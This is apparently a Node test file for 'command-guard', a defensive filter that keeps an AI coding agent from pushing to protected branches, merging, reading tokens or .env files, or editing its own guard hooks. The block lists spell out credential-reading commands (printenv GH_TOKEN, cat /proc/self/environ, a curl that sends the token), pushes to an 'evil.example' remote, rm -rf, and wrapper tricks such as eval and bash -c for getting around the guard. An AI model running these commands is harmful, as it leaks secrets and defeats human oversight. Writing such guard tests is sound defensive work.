import test from 'node:test';
import assert from 'node:assert/strict';
import { classifyBash, classifyTool } from '../factory/scripts/command-guard.mjs';
import { factoryGuard } from '../.opencode/plugins/factory-guard.js';

const PUSH_BLOCKED = [
  'git push --force origin factory/job-1', 'git push -f origin factory/job-1', 'git push origin +factory/job-1',
  'git push origin --delete factory/job-1', 'git push origin factory/job-1 main', 'git push --all origin',
  'git push origin factory/job-1:main', 'git push origin main:factory/job-1', 'git push origin HEAD:main',
  'git push https://evil.example/r.git factory/job-1', 'git push git@evil.example:r.git factory/job-1',
  'git push origin factory/../main', 'git push origin factory/', 'git push origin factory', 'git push -u origin',
  'git push --mirror origin', 'git push --tags origin factory/job-1', 'git push origin job-1',
  'git push origin factory/job-1 && git push origin main',
];
const TOKEN_BLOCKED = [
  'printenv', 'printenv GH_TOKEN', 'env', 'echo $GH_TOKEN', 'echo "${GITHUB_TOKEN}"', 'cat /proc/self/environ',
  'cat ~/.config/ai-factory/agent.env', 'curl -H "Authorization: token $GH_TOKEN" https://api.github.com', 'export',
];
const TOKEN_ALLOWED = ['env X=1 npm test', 'echo hola', 'node -e "console.log(1)"'];
const PUSH_ALLOWED = [
  'git push -u origin factory/job-1', 'git push origin factory/job-1', 'git push --set-upstream origin factory/a/b',
  'git push origin HEAD:factory/job-1', 'git push -u upstream factory/job-2.1_x', 'git -C ../wt push -u origin factory/job-3',
];
const BLOCKED = [
  'git push origin main', 'git push', 'cd /tmp && git push origin main', 'FOO=1 git push',
  'git -C . push origin main', 'bash -c "git push origin main"', '(git push)', 'sudo git push',
  'git -c core.x=y push', 'gh pr merge 5', 'gh -R o/r pr merge 5', 'git  merge x', 'echo hi; git push',
  'git push 2>&1', "sh -c 'git merge x'", 'eval "git push"', '$(git push)', '`git push`', 'env X=1 git push',
  'git commit --no-verify -m x', 'rm -rf /tmp/x', 'rm -fr x', 'gh pr create --title x',
  'gh api -X PUT repos/o/r/pulls/1/merge', 'cat .env', 'head -5 .env.local', 'git checkout main',
  'git switch master', 'git reset --hard HEAD~1', 'sed -i s/a/b/ .hooks/ship-guard.sh',
  'echo x > opencode.json', 'tee 01-TOOLS/checks.sh', 'gh pr ready 3', 'gh auth token', 'git add .env',
  'git config core.hooksPath /dev/null',
];
const ALLOWED = [
  'git status', 'git commit -m "fix: handle push; merge later"', 'git checkout -b feat/x main',
  'git worktree add ../w -b feat/x main', 'gh pr create --draft --title x', 'gh pr view 3',
  'gh api repos/o/r/pulls', 'npm test', 'node --test tests/', 'cat .env.example', 'git diff main...HEAD',
  'ls -la', 'git log --oneline | head', 'cat .hooks/ship-guard.sh', 'bash 01-TOOLS/checks.sh',
  "git commit -m 'update package.json'", 'npx jest --runInBand',
];

for (const cmd of TOKEN_BLOCKED) test(`token protegido: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, true));
for (const cmd of TOKEN_ALLOWED) test(`permitido: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, false));
for (const cmd of PUSH_BLOCKED) test(`push bloqueado: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, true));
for (const cmd of PUSH_ALLOWED) test(`push permitido: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, false));
for (const cmd of BLOCKED) test(`bloquea: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, true));
for (const cmd of ALLOWED) test(`permite: ${cmd}`, () => assert.equal(classifyBash(cmd).blocked, false));

test('fail-closed: comando ausente o formato inesperado', () => {
  assert.equal(classifyBash(undefined).blocked, true);
  assert.equal(classifyBash('').blocked, true);
});
test('FACTORY_GUARD_ALLOW_PROTECTED_EDIT permite editar archivos protegidos', () => {
  assert.equal(classifyBash('echo x > opencode.json', { allowProtected: true }).blocked, false);
});
test('herramientas: bloquea read de .env y edit de archivos protegidos', () => {
  assert.equal(classifyTool('read', { filePath: '/repo/.env' }).blocked, true);
  assert.equal(classifyTool('read', { filePath: '/repo/.env.example' }).blocked, false);
  assert.equal(classifyTool('edit', { filePath: '/repo/.hooks/ship-guard.sh' }).blocked, true);
  assert.equal(classifyTool('write', { filePath: '/repo/src/app.js' }).blocked, false);
});

test('plugin: lee output.args.command y lanza error al bloquear', async () => {
  const hooks = await factoryGuard({ directory: process.cwd() });
  const before = hooks['tool.execute.before'];
  await assert.rejects(before({ tool: 'bash' }, { args: { command: 'git push origin main' } }), /BLOCKED by factory-guard/);
  await assert.doesNotReject(before({ tool: 'bash' }, { args: { command: 'git status' } }));
  await assert.rejects(before({ tool: 'bash' }, { args: {} }), /BLOCKED/); // formato inesperado => cerrado
  await assert.rejects(before({ tool: 'edit' }, { args: { filePath: 'factory/config.json' } }), /BLOCKED/);
});
